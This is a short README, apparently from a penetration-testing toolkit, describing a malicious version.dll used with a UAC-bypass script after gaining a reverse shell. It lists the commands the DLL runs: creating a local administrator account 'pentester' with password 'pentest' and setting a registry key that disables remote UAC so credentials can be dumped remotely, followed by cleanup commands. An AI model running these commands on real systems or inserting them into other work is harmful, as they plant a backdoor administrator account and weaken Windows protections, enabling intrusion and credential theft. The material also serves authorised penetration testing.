# Allow Remote Credentials Dump

## Scenario
---

You just got a reverse shell on a box, running `whoami` and `net localgroup Administrators` shows you that you are part of the local admin group. 

But you don't have any credentials to run tools like `CrackMapExec` remotely. Or you have Credentials, but when you are providing them to `CrackMapExec` it doesn't mark the user as `Pwn3d` and you can't get any credentials.

The reason being that Remote UAC is probably enabled for administrative account, making it impossible to connect on the target with `impacket-wmiexec` or dumping creds with `CrackMapExec`.

---

## Description
---

This version of `version.dll` creates a new account with the name `pentester` and password `pentest` and adds it to the local `Administrators` group.

Therefore it adds a key in the registry in order to disable Remote UAC for local admins account.

The DLL runs the following commands:

```
net user pentester pentest /add
net localgroup Administrators pentester /add
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
After running Invoke-WinSATBypass with this DLL, you should be able to dump credentials remotely with the local admin account `pentester` / `pentest`

---

## Cleaning Up
---

Since we added a new account and tampered with the registry, we need to run these commands in an elevated shell in order to bring things back to normal:

```
net user pentester /DELETE
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f
```
---



